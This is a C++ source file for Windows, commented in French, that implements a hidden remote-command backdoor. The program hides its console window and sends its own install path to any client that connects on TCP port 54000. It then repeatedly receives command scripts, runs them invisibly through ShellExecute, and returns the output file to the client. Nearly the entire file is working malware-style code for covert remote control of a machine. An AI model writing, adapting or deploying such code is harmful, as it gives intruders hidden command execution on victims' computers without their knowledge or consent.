#include<iostream>
#include<string>
#include <fstream>
#include<WS2tcpip.h>
#include <windows.h>
#include<shellapi.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <objbase.h>
#include<dos.h>
#include<conio.h> 

#pragma comment (lib, "ws2_32.lib")
using namespace std;

#define SIZEMESSAGE 10000
#define PORT 54000

////////signature fonction
void WhereIam(void);
void envoyePosition(SOCKET client);
bool etatConnection(SOCKET client);
void EnvoyerFichier(string nomFichier, SOCKET client);
void creationErreur(void);
void ExecuterScript(void);
void processClient(SOCKET client);
void TelechargerScript(SOCKET client);

int main(void) {


	/////////////////////////////////////////cacher l'execution de l'executable
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 0);
	//////////////////////////////////////////////////////////////////////


///////////////////////////////////////////////////Partie connection et creation de socket///////////////////////////////////////////////////////////////////
//Initialize winsock

	WSADATA wsData; // donnee
	WORD version = MAKEWORD(2, 2); // version (2.2)

	WhereIam();

	int wsok = WSAStartup(version, &wsData); // initialise the socket
	if (wsok != 0) { // gestion d'erreur
		cerr << "Can't Initialize winsock! Quitting" << endl;
		return 0;
	}


	//Create a socket 

	SOCKET listening = socket(AF_INET, SOCK_STREAM, 0); // (Adresse famille(IPV4), type de socket(TCP), flag) // socket pour le serveur
	if (listening == INVALID_SOCKET) {
		cerr << "Can't create a socket! Quitting" << endl;
		return 0;
	}

	//Bind the socket to an ip address and port

	sockaddr_in hint; // information d'adresse et de port qu'on va lier a notre socket(socket pour le serveur)
	hint.sin_family = AF_INET;
	hint.sin_addr.S_un.S_addr = INADDR_ANY;// n'importe quelle adresse (inet_addr("127.0.0.1"))
	hint.sin_port = htons(PORT); // htons(Host To Network Short)

	bind(listening, (sockaddr*)&hint, sizeof(hint)); // liaison

	listen(listening, 5);// 5(nombre de socket client a ecouter//5 connection en attente maximun)

	// Tell winsock the socket is for listening 

	while (true) {
		cout << "En attente de connection !!!!!!!!" << endl;
		sockaddr_in client; // information sur le client
		int clientSize = sizeof(client);
		SOCKET clientSocket = accept(listening, (sockaddr*)&client, &clientSize); //attends la connexion d'un client en faisons un boucle//socket pour le client
		cout << "Un client s'est connecte." << endl;

		////////////////////////////echange d'information avec le client//////////////////////////////////////////////////
		processClient(clientSocket);
	
	}

	return 0;
}

void WhereIam(void) {
	string script = "cd>where.txt";
	ofstream file;
	file.open("where.cmd", ios::out| ios::trunc); // creer le script cmd pour savoir ou va etre le repertoire de notre .exe
	file << script;
	file.close();

	LPCWSTR fileLPC = L"where.cmd";

	ShellExecute(NULL, L"open", fileLPC, NULL, NULL, SW_SHOWNORMAL); // execute le script cmd 
}
void envoyePosition(SOCKET client) {
	string where;
	ifstream texte;
	texte.open("where.txt", ios::in);// lit le fichier texte ou se trouve mon emplacement
	getline(texte, where);
	texte.close();

	send(client, where.c_str(), where.length(), 0);// envoye de l'emplacement du .exe
}
bool etatConnection(SOCKET client) {
	char* buffer = new char[SIZEMESSAGE];
	int longeur = recv(client, buffer, SIZEMESSAGE, 0);
	string etat = string(buffer, 0, longeur);
	delete[] buffer;
	if (etat == "true") {
		return true;
	}
	else {
		return false;
	}
}

void EnvoyerFichier(string nomFichier, SOCKET client) { 

	string codeErreur;
	ifstream erreur;
	erreur.open("erreur.txt", ios::in);
	erreur >> codeErreur;
	erreur.close();

	send(client, codeErreur.c_str(), codeErreur.length(), 0);

	if (codeErreur == "good") {

		//ouvrir le fichier et ajouter une ligne
		ofstream texte;
		texte.open(nomFichier, ios::app);
		texte << "\n";
		texte.close();
		//

		ifstream fichier;
		fichier.open(nomFichier, ios::binary);
		fichier.seekg(0, ios::end);
		int length = fichier.tellg();
		fichier.seekg(0, ios::beg);
		char* buffer = new char[length];
		fichier.read(buffer, length);
		send(client, buffer, length, 0); // envoyer le fichier 

		fichier.close();

		delete[] buffer; // liberer l'espace memoire
		buffer = nullptr;
	}

}

void creationErreur(void) {
	ofstream file;
	file.open("erreur.txt", ios::trunc);
	file << "good";
	file.close();
}

void ExecuterScript(void) {

	LPCWSTR fileLPC = L"script.cmd";

	ShellExecute(NULL, L"open", fileLPC, NULL, NULL, SW_HIDE);

}
void TelechargerScript(SOCKET client) {

	char* buffer = new char[SIZEMESSAGE];
	int length = recv(client, buffer, SIZEMESSAGE, 0);
	ofstream file;
	file.open("script.cmd", ios::binary);
	file.write(buffer, length);
	file.close();

	delete[] buffer;
	buffer = nullptr;
}

void processClient(SOCKET client) {
	envoyePosition(client); // envoye la position au client
	while (etatConnection(client)) {
		creationErreur();
		//1//recevoir et ecrire le script
		TelechargerScript(client);
		//2//executer le script
		ExecuterScript();
		//delai avant d'envoyer(important)
		Sleep(5000);//delai de 5 secondes
		//3/envoyer le resultat via un fichier texte
		EnvoyerFichier("script.txt", client);
	}
}